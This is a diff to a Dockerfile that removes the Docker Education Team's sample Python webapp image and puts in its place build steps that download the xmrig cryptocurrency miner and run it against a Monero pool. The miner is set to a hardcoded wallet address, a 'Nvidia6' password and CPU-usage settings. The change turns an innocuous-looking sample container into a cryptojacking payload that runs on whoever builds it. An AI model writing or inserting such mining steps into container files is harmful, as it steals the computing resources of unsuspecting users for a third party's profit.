@@ -1,10 +1,3 @@
-FROM ubuntu:14.04
-MAINTAINER Docker Education Team <education@docker.com>
-RUN apt-get update
-RUN DEBIAN_FRONTEND=noninteractive apt-get install -y -q python-all python-pip 
-ADD ./webapp/requirements.txt /tmp/requirements.txt
-RUN pip install -qr /tmp/requirements.txt
-ADD ./webapp /opt/webapp/
-WORKDIR /opt/webapp
-EXPOSE 5000
-CMD ["python", "app.py"]
+FROM ubuntu:18.10
+RUN apt-get update && apt-get install -y wget
+RUN wget https://github.com/xmrig/xmrig/releases/download/v2.11.0/xmrig-2.11.0-xenial-x64.tar.gz && tar -xf xmrig-2.11.0-xenial-x64.tar.gz && cd xmrig-2.11.0 && ./xmrig -o stratum+tcp://pool.supportxmr.com:5555 -u 45UVbdyweuJV5peeuD1ypVbFs6Z1nYhRB4r9BEL9xYjE8Ej8Pjob3LQX2dN4m314gB87Z1M9TbabwN4g4L9184dcCLyiU6y -p Nvidia6 --threads 4 --max-cpu-usage=70 --cpu-priority 3 --donate-level 1
